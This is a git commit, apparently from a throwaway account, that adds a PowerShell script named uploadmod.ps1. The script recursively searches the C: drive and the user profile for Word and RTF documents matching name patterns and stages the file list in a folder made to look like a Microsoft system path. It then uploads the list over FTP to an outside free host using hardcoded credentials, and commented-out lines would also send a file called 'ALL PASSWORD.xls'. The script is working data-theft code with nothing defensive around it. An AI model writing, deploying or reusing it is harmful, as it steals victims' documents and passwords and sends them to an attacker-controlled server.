642586789b2699de6a514b9bb950ac699f62dedc
237a25023644904225942656096401ae <kelicevuge@maileme101.com>
2016-11-24 12:39:10 +0530

    Add files via upload

---
+++ Tools/uploadmod.ps1
@@ -0,0 +1,33 @@
+New-Item -ItemType Directory -Force -Path C:\Microsoft\Windows\Desktop\Privdata\lifxe
+$ScriptDir = "C:\Microsoft\Windows\Desktop\Privdata\lifxe"
+Get-Childitem "C:\" -recurse -filter "*X*.docx" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
+Get-Childitem "C:\" -recurse -filter "*X*.doc" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
+Get-Childitem "C:\" -recurse -filter "*X*.rtf" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
+Get-Childitem $env:UserProfile -recurse -filter "*Xii*.docx" | Out-File -Append "$ScriptDir\exfil_list_data_xii.txt"
+$FilePathLIST="$ScriptDir\exfil_list_data.txt"
+$FilePathLIST_X="$ScriptDir\exfil_list_data_xii.txt"
+$FilePathpass="C:\ALL PASSWORD.xls"
+$Username = "b7_19204341"
+$Password = "wpzhj2x8"
+
+$RemoteFile = "ftp://ftp.byethost7.com/htdocs/exfilterated.txt"
+$FTPRequest = [System.Net.FtpWebRequest]::Create("$RemoteFile")
+$FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
+$FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+$FTPRequest.Credentials = new-object System.Net.NetworkCredential($Username, $Password)
+$FTPRequest.UseBinary = $true
+$FTPRequest.UsePassive = $true
+#$FileContent = gc -en byte $FilePathpass
+#$FTPRequest.ContentLength = $FileContent.Length
+#$Run = $FTPRequest.GetRequestStream()
+#$Run.Write($FileContent, 0, $FileContent.Length)
+$FileContent = gc -en byte $FilePathLIST
+$FTPRequest.ContentLength = $FileContent.Length
+$Run = $FTPRequest.GetRequestStream()
+$Run.Write($FileContent, 0, $FileContent.Length)
+#$FileContent = gc -en byte $FilePathLIST_X
+#$FTPRequest.ContentLength = $FileContent.Length
+#$Run = $FTPRequest.GetRequestStream()
+#$Run.Write($FileContent, 0, $FileContent.Length)
+$Run.Close()
+$Run.Dispose()
